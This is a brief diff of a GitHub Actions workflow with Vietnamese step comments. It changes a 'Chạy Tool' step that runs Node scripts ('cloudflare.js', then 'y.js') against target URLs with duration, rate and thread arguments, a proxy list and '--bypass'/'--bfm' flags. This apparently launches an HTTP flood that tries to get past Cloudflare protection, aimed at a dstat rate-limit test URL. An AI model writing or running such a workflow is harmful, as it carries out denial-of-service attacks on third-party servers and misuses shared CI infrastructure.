@@ -37,5 +37,5 @@ jobs:
 
       # Chạy file với hệ số
       - name: Chạy Tool
-        run: node cloudflare.js GET https://cloudvipvn.site 100 4 32 proxyvip.txt --bypass
+        run: node y.js https://rate-limit-1.dstatbot.win/OwB0uQNA 600 4 32 --bfm proxyvip.txt --bypass
         
